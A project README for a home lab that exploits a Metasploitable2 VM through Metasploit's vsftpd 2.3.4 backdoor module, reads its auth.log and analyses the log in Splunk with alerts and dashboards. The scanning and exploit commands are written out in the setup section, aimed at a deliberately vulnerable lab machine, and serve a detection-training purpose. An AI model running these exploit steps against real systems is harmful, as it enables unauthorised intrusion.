# 🔍 Penetration Testing and Log Analysis Using Metasploit and Splunk

## 📌 Project Overview

This project demonstrates how to simulate a penetration test using **Metasploit** and analyze resulting logs with **Splunk**. A vulnerable system (Metasploitable2) was exploited via FTP, and its `auth.log` file was extracted, saved, and ingested into Splunk for forensic analysis. This workflow highlights how SOC analysts can detect malicious behavior through log monitoring and dashboard-based alerting.

---

## 🎯 Objectives

- ⚔️ Exploit a vulnerable system using Metasploit
- 📁 Extract and collect system logs (`auth.log`)
- 🔎 Analyze those logs using Splunk
- 📊 Visualize login attempts and system activities
- 🚨 Set up alerts and dashboards to monitor suspicious behavior

---

## 🛠️ Tools & Technologies Used

| Tool         | Purpose                                 |
|--------------|------------------------------------------|
| Kali Linux   | Attacker machine                        |
| Metasploit   | Exploitation framework                  |
| Mousepad     | Text editor to save logs                |
| Splunk       | Log analysis and visualization platform |
| Metasploitable2 | Target VM with known vulnerabilities |

---

## 🧱 Setup & Execution

### 🖥️ Environment Setup

- **Attacker**: Kali Linux
- **Target**: Metasploitable2 (IP used: `192.168.1.81`)
- **Network**: Internal or Host-only

---

### 🧨 Exploiting the System

1. Start Metasploitable2 and find target IP using:
   ```bash
   ifconfig
Scan target:

bash
Copy
Edit
sudo nmap -sV -Pn 192.168.1.81
Launch Metasploit:

bash
Copy
Edit
msfconsole
Use the backdoor exploit for vsftpd:

bash
Copy
Edit
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.81
exploit
📄 Extracting and Saving Logs
Access the target system's logs:

bash
Copy
Edit
cd /var/log
cat auth.log
Copy logs using mousepad:

bash
Copy
Edit
mousepad
Paste logs and save the file with .log extension.

🔍 Analyzing Logs in Splunk
Start Splunk:

bash
Copy
Edit
/opt/splunk/bin/splunk start
Open in browser:

arduino
Copy
Edit
http://kali:8000
Go to:

arduino
Copy
Edit
Settings → Add Data → Upload File
Upload your .log file
Set source type as default, create a new index and host.

🚨 Creating Alerts and Dashboards
After indexing, search for suspicious events.

Click:

vbnet
Copy
Edit
Save As → Alert
Set alert name, description, and trigger conditions

To visualize:

pgsql
Copy
Edit
Save As → Report → Add to Dashboard
Go to Dashboard, customize:

Use bar charts, line graphs, pie charts, etc.

📊 Results
⚠️ Over 900+ events were parsed from the auth.log file

Suspicious login patterns and command activity were detected

Created a dashboard for real-time monitoring

Splunk successfully visualized exploitation footprints

🧠 Key Learnings
✅ Real-world exploitation via Metasploit

✅ Importance of centralized log analysis

✅ How to use Splunk to detect attacker behavior

✅ Basics of alert creation and dashboarding in SOC tools

📎 Full Project Report

[📄 Click here to view the complete PDF report](https://drive.google.com/file/d/1kjl1leIBrqRs-TivAkfvgoykQzwRRXUF/view?usp=sharing)

